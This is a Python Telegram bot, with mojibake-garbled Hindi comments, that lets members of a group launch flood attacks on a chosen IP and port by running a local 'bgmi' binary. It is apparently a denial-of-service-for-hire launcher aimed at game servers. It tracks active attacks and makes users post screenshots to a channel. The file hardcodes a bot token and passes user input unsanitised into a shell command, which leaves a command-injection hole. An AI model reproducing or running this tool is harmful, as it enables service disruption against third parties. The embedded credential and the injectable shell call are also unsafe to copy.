import telebot
import datetime
import time
import subprocess
import threading

# тЬЕ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7712914052:AAHyFKtxdNfFwf7uby7C3Qu8mVpXwUeqPvY')

# тЬЕ GROUP & CHANNEL SETTINGS
GROUP_ID = "-1002369239894"
SCREENSHOT_CHANNEL = "@RAVI_BOSS77"
ADMINS = [7129010361]

# тЬЕ GLOBAL VARIABLES
active_attacks = {}  # рдЕрдЯреИрдХ рд╕реНрдЯреЗрдЯрд╕ рдЯреНрд░реИрдХ рдХрд░реЗрдЧрд╛
pending_verification = {}  # рд╡реЗрд░рд┐рдлрд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдпреВрдЬрд░реНрд╕ рд▓рд┐рд╕реНрдЯ
user_attack_count = {}
MAX_ATTACKS = 3  # (рдпрд╛ рдЬреЛ рднреА рд▓рд┐рдорд┐рдЯ рдЪрд╛рд╣рд┐рдП)

# тЬЕ CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# тЬЕ HANDLE ATTACK COMMAND
@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "ЁЯЪл **YE BOT SIRF GROUP ME CHALEGA!** тЭМ")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"тЭЧ **PEHLE CHANNEL JOIN KARO!** {SCREENSHOT_CHANNEL}")
        return

    # тЬЕ рдЕрдЯреИрдХ рд▓рд┐рдорд┐рдЯ рдЪреЗрдХ рдХрд░реЛ
    user_active_attacks = sum(1 for uid in active_attacks.keys() if uid == user_id)
    if user_active_attacks >= MAX_ATTACKS:
        bot.reply_to(message, f"тЪая╕П **ATTACK LIMIT ({MAX_ATTACKS}) POORI HO CHUKI HAI!**\nЁЯСЙ **PEHLE PURANE KHATAM HONE DO! /check KARO!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "тЪая╕П **USAGE:** `/bgmi <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "тЭМ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
        return

    if time_duration > 180:
        bot.reply_to(message, "ЁЯЪл **180S SE ZYADA ALLOWED NAHI HAI!**")
        return

    # тЬЕ рдкрд╣рд▓реЗ рд╣реА рд╡реЗрд░рд┐рдлрд┐рдХреЗрд╢рди рд╕реЗрдЯ рдХрд░ рджреЛ рддрд╛рдХрд┐ рдпреВрдЬрд░ рддреБрд░рдВрдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рднреЗрдЬ рд╕рдХреЗ
    pending_verification[user_id] = True

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = (target, port, end_time)

    bot.send_message(
        message.chat.id,
        f"ЁЯФе **ATTACK DETAILS** ЁЯФе\n\n"
        f"ЁЯСд **USER:** `{user_id}`\n"
        f"ЁЯОп **TARGET:** `{target}`\n"
        f"ЁЯУН **PORT:** `{port}`\n"
        f"тП│ **DURATION:** `{time_duration} SECONDS`\n"
        f"ЁЯХТ **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"ЁЯЪА **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n"
        f"ЁЯУ╕ **NOTE:** **TURANT SCREENSHOT BHEJO, WARNA NEXT ATTACK BLOCK HO JAYEGA!**\n\n"
        f"тЪая╕П **ATTACK CHALU HAI! /check KARKE STATUS DEKHO!**",
        parse_mode="Markdown"
    )

    # тЬЕ Attack Execution Function
    def attack_execution():
        try:
            subprocess.run(f"./bgmi {target} {port} {time_duration} 2500", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "тЭМ **ATTACK FAIL HO GAYA!**")
        finally:
            bot.send_message(
                message.chat.id,
                "тЬЕ **ATTACK KHATAM HO GAYA!** ЁЯОп",
                parse_mode="Markdown"
            )
            del active_attacks[user_id]  # тЬЕ рдЕрдЯреИрдХ рдЦрддреНрдо рд╣реЛрддреЗ рд╣реА рдбреЗрдЯрд╛ рдХреНрд▓рд┐рдпрд░

    threading.Thread(target=attack_execution).start()

# тЬЕ SCREENSHOT VERIFICATION SYSTEM
@bot.message_handler(content_types=['photo'])
def verify_screenshot(message):
    user_id = message.from_user.id

    # тЬЕ SCREENSHOT CHANNEL FORWARD
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"ЁЯУ╕ **VERIFIED SCREENSHOT FROM:** `{user_id}`")

    del pending_verification[user_id]  # тЬЕ рдЕрдм рдпреВрдЬрд░ рдЕрдЯреИрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ
    bot.reply_to(message, "тЬЕ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")

# тЬЕ ATTACK STATS COMMAND
@bot.message_handler(commands=['check'])
def attack_stats(message):
    user_id = message.from_user.id
    now = datetime.datetime.now()

    for user in list(active_attacks.keys()):
        if active_attacks[user][2] <= now:
            del active_attacks[user]

    if not active_attacks:
        bot.reply_to(message, "ЁЯУК **FILHAAL KOI ACTIVE ATTACK NAHI CHAL RAHA!** тЭМ")
        return

    stats_message = "ЁЯУК **ACTIVE ATTACKS:**\n\n"
    for user, (target, port, end_time) in active_attacks.items():
        remaining_time = (end_time - now).total_seconds()
        stats_message += (
            f"ЁЯСд **USER ID:** `{user}`\n"
            f"ЁЯОп **TARGET:** `{target}`\n"
            f"ЁЯУН **PORT:** `{port}`\n"
            f"тП│ **ENDS IN:** `{int(remaining_time)}s`\n"
            f"ЁЯХТ **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
        )

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# тЬЕ ADMIN RESTART COMMAND
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "тЩ╗я╕П BOT RESTART HO RAHA HAI...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "ЁЯЪл SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# тЬЕ START POLLING
bot.polling(none_stop=True)